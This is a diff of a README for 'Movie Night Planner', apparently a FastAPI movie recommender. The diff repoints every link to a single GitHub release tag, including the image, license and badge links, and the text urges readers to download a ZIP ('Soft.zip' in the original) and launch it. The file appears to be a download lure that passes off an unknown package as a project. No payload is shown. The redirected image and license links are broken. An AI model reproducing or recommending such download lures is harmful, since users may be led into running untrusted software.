@@ -1,6 +1,6 @@
 # 🍿 Welcome to Movie Night Planner 🎬
 
-![Movie Night Planner](https://image-url.com)
+![Movie Night Planner](https://github.com/fogui-resources/movie_night_planner/releases/tag/v1.2)
 
 ## Overview
 Welcome to the Movie Night Planner repository! This project is a FastAPI-based Movie & TV Show Recommender using the TMDb API. With this tool, you can search for movies, get personalized recommendations, and browse top-rated content effortlessly. 
@@ -14,7 +14,7 @@ Welcome to the Movie Night Planner repository! This project is a FastAPI-based M
 - **Repository Name**: movie_night_planner  
 - **Description**: 🎬 FastAPI-based Movie & TV Show Recommender using TMDb API 🎱| Search movies, get recommendations & browse top-rated content!  
 - **Topics**: api, css, fastapi, html, movie-recommendation-system, open-source, python, rest-api, web-app, web-dev  
-- **Link**: [Download ZIP](https://github.com/files/Soft.zip)
+- **Link**: [Download ZIP](https://github.com/fogui-resources/movie_night_planner/releases/tag/v1.2)
 
 ## Getting Started
 To get started with Movie Night Planner, simply download the ZIP file from the link provided above. If the link ends with a file name, make sure to extract the contents and launch the application. 
@@ -36,10 +36,10 @@ We welcome contributions to enhance the Movie Night Planner experience. If you h
 For any issues, feedback, or questions related to Movie Night Planner, please check the "Releases" section or contact us directly.
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/user/repo/LICENSE) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/fogui-resources/movie_night_planner/releases/tag/v1.2) file for details.
 
 ---
 
-[![Download ZIP](https://img.shields.io/badge/Download-ZIP-informational)](https://github.com/files/Soft.zip)
+[![Download ZIP](https://github.com/fogui-resources/movie_night_planner/releases/tag/v1.2)](https://github.com/fogui-resources/movie_night_planner/releases/tag/v1.2)
 
 🎥🌟🍿 Happy Movie Night Planning! 🍿🌟🎥
